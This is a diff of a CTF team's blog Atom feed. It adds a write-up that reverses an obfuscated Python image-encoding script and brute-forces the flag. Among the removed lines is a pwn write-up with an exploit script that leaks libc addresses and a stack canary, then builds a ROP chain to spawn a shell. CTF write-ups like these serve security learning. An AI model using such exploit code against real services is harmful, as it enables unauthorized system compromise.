@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://teamrocketist.github.io/"/>
-  <updated>2017-12-04T05:36:34.611Z</updated>
+  <updated>2017-12-04T06:14:05.482Z</updated>
   <id>https://teamrocketist.github.io/</id>
   
   <author>
@@ -16,11 +16,55 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>[Reverse] TPCTF2017 - Bad Encryption</title>
+    <link href="https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/"/>
+    <id>https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/</id>
+    <published>2017-12-04T06:06:23.000Z</published>
+    <updated>2017-12-04T06:14:05.482Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><br>Bad Encryption<br>100<br><br>I was making an encryption program, but it is far from perfect. Instead of make the encryption work, I decided to just encrypt everything 100 times.<br><br>Author: Kevin Higgs<br><br></blockquote>
+
+<p>We have a python program, which is little bit obfuscated with this horrible named variables:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">    tel1l1l1l1l1l1l1lt = <span class="string">"REDACTED"</span></div><div class="line">    <span class="keyword">import</span> builtins, random</div><div class="line">    l1l1l1l1l1l1l1l = getattr(builtins, <span class="string">"__import__"</span>)</div><div class="line">    l1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l(<span class="string">"PIL.Image"</span>)</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l.Image</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.new(<span class="string">"RGB"</span>, (len(tel1l1l1l1l1l1l1lt), <span class="number">1</span>), <span class="string">"white"</span>)</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.load()</div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l111l1l11 = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 <span class="keyword">in</span> tel1l1l1l1l1l1l1lt:</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 = ord(l1l1l1l1l1l1l1ll1l1l1l1l1l1l11)</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l111 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l112 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1lll1l113 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l111 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111/<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l112 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l112/<span class="number">256</span>)</div><div class="line">        l1l1l1l1l1l1l11ll1l1l1l1lll1l113 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l113/<span class="number">256</span>)</div><div class="line">        l1l121l1l1l1l11ll1l1l1l1lll1l111 = l1l1l1l1l1l1l1ll1l1l1l1l1l1l11*l1l1l1l1l1l1l11ll1l1l1l1lll1l111</div><div class="line">        l1l121l1l1l1l11ll1l1l1l1lll1l112 = l1l121l1l1l1l11ll1l1l1l1lll1l111*l1l1l1l1l1l1l11ll1l1l1l1lll1l112</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l[l1l1l1l1l1l1l1ll1l1l1l111l1l11,<span class="number">0</span>] = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111, l1l1l1l1l1l1l1ll1l1l1l1lll1l112, round(l1l121l1l1l1l11ll1l1l1l1lll1l112*<span class="number">10</span>))</div><div class="line">        l1l1l1l1l1l1l1ll1l1l1l111l1l11 += <span class="number">1</span></div><div class="line">    l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.save(<span class="string">"out"</span>+str(i)+<span class="string">".png"</span>)</div></pre></td></tr></table></figure>
+<p>After fixing the code to be more readable I got this:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">    <span class="keyword">import</span> builtins, random</div><div class="line">    img = Image.new(<span class="string">"RGB"</span>, (len(flag), <span class="number">1</span>), <span class="string">"white"</span>)</div><div class="line">    pixels = img.load()</div><div class="line">    counter = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> flag:</div><div class="line">        character = ord(character)</div><div class="line">        rand0 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        rand1 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</div><div class="line">        rand3 = (rand0/<span class="number">256</span>)</div><div class="line">        rand4 = (rand1/<span class="number">256</span>)</div><div class="line">        rand5 = character*rand3</div><div class="line">        rand6 = rand5*rand4</div><div class="line">        pixels[counter,<span class="number">0</span>] = (rand0, rand1, round(rand6*<span class="number">10</span>))</div><div class="line">        counter += <span class="number">1</span></div><div class="line">    img.save(<span class="string">"out"</span>+str(i)+<span class="string">".png"</span>)</div></pre></td></tr></table></figure>
+<p>We can see <code>rand0</code> and <code>rand1</code> are being random generated, but they are putted directly into the image in the pixels red and blue!, by having these two we can calculate <code>round(rand6*10)</code> easily by doing some arithmetic operations, with this we can do a script that brute-forces the flag byte by byte, by comparing the blue pixels from the image with the ones we calculated:</p>
+<p>The pseudo code:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> character <span class="keyword">in</span> all_printable_characters:</div><div class="line">    <span class="keyword">for</span> pixel <span class="keyword">in</span> image:</div><div class="line">        rand0 = pixel.red</div><div class="line">        rand1 = pixel.blue</div><div class="line">        rand3 = rand0/<span class="number">256</span></div><div class="line">        rand4 = rand1/<span class="number">256</span></div><div class="line">        rand5 = ord(character)*rand3</div><div class="line">        rand6 = rand5*rand4</div><div class="line">        <span class="keyword">if</span> rand6 == pixel.blue:</div><div class="line">            flag += character</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
+<p>But we ran into a problem, as the description of the challenge says sometimes the <strong>encryption doesn’t work</strong> and one of the reasons is the calculations made by the <code>rand</code> variables can be <strong>above 255</strong> (Kind of depends of the random value or the character), we know that color pixels from the images can only handle colors in the range of 0-255 (in this case python will set the pixel as 255), a byte! </p>
+<p>This why the encryption does it multiple times (100) with different random values, another problem we have is once in a while <strong>multiple characters matches the same blue pixel</strong>, in these both cases we can’t know for sure if it is the character we want.</p>
+<p>So my solution to this was to ignore all characters that were <strong>above 255</strong> and those that had <strong>multiple solutions</strong> to that <strong>byte position</strong> of the flag, since we have more than enough images (100) the characters we failed to find we can recheck them in the rest of the pictures.</p>
+<p>The final python script I used was (note that using python3 in this challenge was absolutely necessary):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os, sys</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="comment"># flag size is 38</span></div><div class="line">flags = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">	flag = []</div><div class="line">	im = Image.open(<span class="string">"out%d.png"</span>%i)</div><div class="line">	width = im.size[<span class="number">0</span>] <span class="comment">#define W and H</span></div><div class="line">	height = im.size[<span class="number">1</span>]</div><div class="line">	pix = im.load()</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,width):</div><div class="line">		stop = <span class="keyword">True</span></div><div class="line">		found = <span class="number">0</span></div><div class="line">		<span class="keyword">for</span> character <span class="keyword">in</span> string.printable:</div><div class="line">			r,g,b = pix[x,<span class="number">0</span>]</div><div class="line">			rand0 = r</div><div class="line">			rand1 = g</div><div class="line">			rand3 = rand0/<span class="number">256</span></div><div class="line">			rand4 = rand1/<span class="number">256</span></div><div class="line">			rand5 = ord(character)*rand3</div><div class="line">			rand6 = rand5*rand4</div><div class="line">			<span class="keyword">if</span> round(rand6*<span class="number">10</span>) &gt;= <span class="number">255</span>:</div><div class="line">				<span class="keyword">continue</span></div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				<span class="keyword">if</span> round(rand6*<span class="number">10</span>) == b:</div><div class="line">					found += <span class="number">1</span></div><div class="line">					stop = <span class="keyword">False</span></div><div class="line">					<span class="keyword">if</span> found == <span class="number">1</span>:</div><div class="line">						flag.append(character)</div><div class="line">					<span class="keyword">else</span>:</div><div class="line">						flag[x] = <span class="string">'x'</span></div><div class="line">		<span class="keyword">if</span> stop:</div><div class="line">			flag.append(<span class="string">'x'</span>)</div><div class="line">	flags.append(<span class="string">''</span>.join(flag))</div><div class="line"></div><div class="line">final_flag = list(<span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>)</div><div class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flags:</div><div class="line">	<span class="keyword">for</span> i,c <span class="keyword">in</span> enumerate(flag):</div><div class="line">		<span class="keyword">if</span> c != <span class="string">'x'</span>: </div><div class="line">			final_flag[i] = c</div><div class="line"><span class="keyword">print</span> (<span class="string">''</span>.join(final_flag))</div></pre></td></tr></table></figure>
+<p>Running it</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python3 reverse.py</div><div class="line">tpctf&#123;i_c4nt_7h1nk_0f_a_fUnny_f14g_:(&#125;</div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;&lt;br&gt;Bad Encryption&lt;br&gt;100&lt;br&gt;&lt;br&gt;I was making an encryption program, but it is far from perfect. Instead of make the encryption 
+    
+    </summary>
+    
+      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
+    
+    
+      <category term="bruteforce" scheme="https://teamrocketist.github.io/tags/bruteforce/"/>
+    
+      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
+    
+      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
+    
+      <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
+    
+      <category term="python3" scheme="https://teamrocketist.github.io/tags/python3/"/>
+    
+  </entry>
+  
+  <entry>
     <title>[Web] TPCTF2017 - Management</title>
     <link href="https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/"/>
     <id>https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/</id>
     <published>2017-12-04T05:20:20.000Z</published>
-    <updated>2017-12-04T05:36:34.611Z</updated>
+    <updated>2017-12-04T05:43:19.986Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>Management<br>60<br><br>I’ve created a new website so you can do all your important management. It includes users, creating things, reading things, and… well, not much else. Maybe there’s a flag?<br><br>Second instance running at 52.90.229.46:8558<br><br>tpctf{san1t1z3_y0ur_1npu7s} is not the correct flag. Look harder ;)<br>Note: the flag format is flag{}, not the usual tpctf{}<br><br>Author: Kevin Higgs<br><br></blockquote>
 
@@ -46,9 +90,9 @@
     
       <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
     
-      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
-    
       <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
+    
+      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
     
       <category term="blindSqli" scheme="https://teamrocketist.github.io/tags/blindSqli/"/>
     
@@ -82,13 +126,13 @@
     
       <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
     
+      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
+    
       <category term="xss" scheme="https://teamrocketist.github.io/tags/xss/"/>
     
       <category term="passwordreset" scheme="https://teamrocketist.github.io/tags/passwordreset/"/>
     
       <category term="jquery" scheme="https://teamrocketist.github.io/tags/jquery/"/>
-    
-      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
     
   </entry>
   
@@ -154,11 +198,11 @@
     
       <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
     
+      <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
+    
       <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
     
       <category term="r2script" scheme="https://teamrocketist.github.io/tags/r2script/"/>
-    
-      <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
     
       <category term="tuctf2017" scheme="https://teamrocketist.github.io/tags/tuctf2017/"/>
     
@@ -338,9 +382,9 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
       <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
+    
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
   </entry>
   
@@ -800,9 +844,9 @@ d = []
     
       <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
     
-      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
+      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
     
   </entry>
   
@@ -853,6 +897,8 @@ d = []
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
       <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
@@ -860,44 +906,6 @@ d = []
       <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
     
       <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[Forensics] CSAW - Best Router</title>
-    <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/"/>
-    <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/</id>
-    <published>2017-09-19T09:34:16.000Z</published>
-    <updated>2017-09-26T19:18:07.658Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><br>    Best Router<br>    <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a><br>    NOTE: This will expand to ~16GB!<br>    19:00 Eastern: updated. Old flags have been removed.<br></blockquote>
-
-<p>Forensics challenge we have an img with 16GB, and an online service at <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a>, the service asks for a username and a password so we guessed we need to find them in the img, so lets use autopsy to search in the linux filesystem for filenames that contain the word flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/WBkVL6L.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/WBkVL6L.png" alt=""><br></a></p>
-<p>As we can see we can found a <code>/var/www/flag.txt</code> unfortunately the file is empty, but we have the files of the web service of the link provided!<br><a data-fancybox="gallery" href="https://i.imgur.com/21qqjhh.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/21qqjhh.png" alt=""><br></a></p>
-<p>Checking the username.txt and password.txt we can see that we have the username and password!<br><a data-fancybox="gallery" href="https://i.imgur.com/xCDzRDG.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xCDzRDG.png" alt=""><br></a><br><a data-fancybox="gallery" href="https://i.imgur.com/ur0yCl6.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/ur0yCl6.png" alt=""><br></a></p>
-<p>After using the credentials on the web page we got the flag!<br><a data-fancybox="gallery" href="https://i.imgur.com/b46URKw.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/b46URKw.png" alt=""><br></a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;&lt;br&gt;    Best Router&lt;br&gt;    &lt;a href=&quot;http://forensics.chal.csaw.io:3287&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://forensics.chal.csa
-    
-    </summary>
-    
-      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
-    
-    
-      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
-    
-      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
-    
-      <category term="partitions" scheme="https://teamrocketist.github.io/tags/partitions/"/>
-    
-      <category term="disk" scheme="https://teamrocketist.github.io/tags/disk/"/>
-    
-      <category term="autopsy" scheme="https://teamrocketist.github.io/tags/autopsy/"/>
     
   </entry>
   
@@ -940,61 +948,38 @@ d = []
   </entry>
   
   <entry>
-    <title>[Pwn] CSAW - scv</title>
-    <link href="https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-scv/"/>
-    <id>https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-scv/</id>
-    <published>2017-09-18T20:59:25.000Z</published>
-    <updated>2017-10-05T03:00:21.484Z</updated>
+    <title>[Forensics] CSAW - Best Router</title>
+    <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/"/>
+    <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/</id>
+    <published>2017-09-19T09:34:16.000Z</published>
+    <updated>2017-09-26T19:18:07.658Z</updated>
     
-    <content type="html"><![CDATA[<blockquote><br>SCV<br><br>SCV is too hungry to mine the minerals. Can you give him some food?<br><br>nc pwn.chal.csaw.io 3764<br><br></blockquote>
+    <content type="html"><![CDATA[<blockquote><br>    Best Router<br>    <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a><br>    NOTE: This will expand to ~16GB!<br>    19:00 Eastern: updated. Old flags have been removed.<br></blockquote>
 
-<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>The binary is pretty simple to read we have 3 options, option 1 is to feed the SCV which is just filling a buffer with string from <code>stdin</code>, option 2 prints the string using <code>puts</code> so no format string vulnerability possible here, option 3 is to exit the program.</p>
-<p>Pretty simple but where is the vulnerability? We can see the number of bytes in the parameters of <code>read</code> function is bigger than what the buffer can handle so we have a buffer overflow vulnerability but the real problem is how are we going to bypass this protections?:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/Ol6bY6D.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/Ol6bY6D.png" alt=""><br></a></p>
-<p>NX is enabled so the stack is not executable! we can bypass this easily using return-oriented-programming(ROP), but<br>another stack protection is enabled too which is the <strong>stack canary</strong>, we need to find away to leak addresses from the stack! but how do we do this?</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/kjykann.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/kjykann.png" alt=""><br></a></p>
-<p>As we can see above the <code>read</code> function is reading the buf from STDIN, and what can we know about <code>read</code>? This function <strong>doesn’t put a null byte</strong> at the end of the read string, this awesome ! and why? because latter with option 2 <code>puts</code> will print the string until it finds a <em>null byte</em>, we can use this to our advantage to <strong>leak addresses</strong> from libc from the <strong>stack</strong> and even the <strong>stack canary</strong> itself! We just need to use gdb and look up the memory!</p>
-<p>The plan is pretty simple:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1 - Leak libc addresses and stack canary</div><div class="line">2 - Overflow the buffer and return to libc</div></pre></td></tr></table></figure>
-<h3 id="Leak-libc-addresses-and-stack-canary"><a href="#Leak-libc-addresses-and-stack-canary" class="headerlink" title="Leak libc addresses and stack canary"></a>Leak libc addresses and stack canary</h3><p>Lets do some debugging with gdb lets put a break point right before the read occurs and check the values of the buffer before being filled:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/pKfMLAJ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pKfMLAJ.png" alt=""><br></a></p>
-<p>As we can see there is a libc address in stack <code>0x00007f2cea4aabe9</code> we can count it easily how much we need to fill the buffer to print that address! and we need 40 bytes.<br>Writing the code to do this is very simple can be built in a function like this:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">readAddressFromTheStack</span><span class="params">(size, bytes_to_read, offset=<span class="number">0</span>)</span>:</span></div><div class="line">	<span class="string">"""</span></div><div class="line"><span class="string">    Args:</span></div><div class="line"><span class="string">        size (int): number of characters to send to the stack.</span></div><div class="line"><span class="string">        bytes_to_read (int): number of bytes to read from the stack we want to leak.</span></div><div class="line"><span class="string">		offset (int): number to subtract if we want to adjust the leaked address. (Optional)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    Returns:</span></div><div class="line"><span class="string">        int: returns an address leaked from the stack.</span></div><div class="line"><span class="string">	"""</span></div><div class="line">	</div><div class="line">	<span class="comment"># Write a certain number of bytes to leak an address</span></div><div class="line">	r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'1'</span>)</div><div class="line">	r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'A'</span>*size)</div><div class="line"></div><div class="line">	<span class="comment"># Read it from the stack</span></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'2'</span>)</div><div class="line">	r.recvuntil(<span class="string">'[*]PLEASE TREAT HIM WELL.....'</span>)</div><div class="line">	r.recvline()</div><div class="line">	r.recvline()</div><div class="line">	r.recv(size)</div><div class="line">	<span class="keyword">return</span> u64(r.recv(bytes_to_read).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))-offset</div></pre></td></tr></table></figure>
-<p>So what to do with this address? we can calculate its offset to <code>system</code> for example! we can get the system address to calculate the offset and subtract the both values:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/DTsmBOe.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/DTsmBOe.png" alt=""><br></a></p>
-<p>Implementing this in python would be like this:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Get a libc address from the stack</span></div><div class="line">LEAKED = readAddressFromTheStack(<span class="number">40</span>, <span class="number">6</span>, <span class="number">-0x8f</span>)</div><div class="line">SYSTEM = LEAKED + <span class="number">0xb0f7</span></div><div class="line">LIBCBASE = SYSTEM -libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc-2.23.so | grep '/bin/sh'</span></div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line"></div><div class="line">log.info(<span class="string">"LEAKED LIBC 0x%x"</span> % LEAKED)</div><div class="line">log.info(<span class="string">"SYSTEM LIBC 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div></pre></td></tr></table></figure>
-<p>The 3rd argument of <code>readAddressFromTheStack</code> is adjusting the address because in the <code>read</code> we are reading 40 bytes plus the new line character ‘\n’ because to send to the server we need to press enter, I could actually instead of sending 40 bytes in the padding we could just send 39 and the number would be right but I got lazy during the CTF so instead of fixing that I just readjust the address, the leaked address will always be overwritten with <code>0x0a</code> which is ‘\n’ Ascii code representation, so as I said before it needs some adjusting.</p>
-<h4 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack canary"></a>Stack canary</h4><p>Now that we have everything we need for libc we just need to get the stack canary address! to check where its being stored we can look at the very beginning of the main function</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/2L4LYMj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/2L4LYMj.png" alt=""><br></a></p>
-<p>From radare2 we can check it is being stored at local_8h which is a friendly name to be more readable in reality thinking it in assembly it’s stored in RBP-0x8 where RBP is the baseframe pointer.  </p>
-<p>So lets check again in gdb, put a break point right before the <code>read</code> function and print the RBP-0x8 to see the stack canary value:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/XHHEnfr.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/XHHEnfr.png" alt=""><br></a></p>
-<p>Here is the code to get the stack canary from the stack:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># leak STACK CANARY</span></div><div class="line">STACK_CANARY = readAddressFromTheStack(<span class="number">40</span>+<span class="number">8</span>*<span class="number">16</span>, <span class="number">8</span>, <span class="number">0x0A</span>)</div><div class="line">log.info(<span class="string">"STACK CANARY 0x%x"</span> % STACK_CANARY)</div></pre></td></tr></table></figure>
-<h4 id="Overflow-the-buffer-and-return-to-libc"><a href="#Overflow-the-buffer-and-return-to-libc" class="headerlink" title="Overflow the buffer and return to libc"></a>Overflow the buffer and return to libc</h4><p>We already have everything we need we just need to jump to libc rewrite the stack canary where it should be and remember we can’t forget to choose option 3 to exit the program, otherwise we never execute the <code>ret</code> assembly instruction and jump to <code>system(&quot;/bin/sh&quot;);</code>:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">ROPCHAIN = <span class="string">''</span></div><div class="line">ROPCHAIN += p64(POPRET)</div><div class="line">ROPCHAIN += p64(BINSH)</div><div class="line">ROPCHAIN += p64(SYSTEM)</div><div class="line"></div><div class="line">padding3 = <span class="string">'A'</span>*(<span class="number">40</span>+<span class="number">8</span>*<span class="number">16</span>)+p64(STACK_CANARY)+ <span class="string">'AAAAAAAA'</span> + ROPCHAIN</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#rewrite old 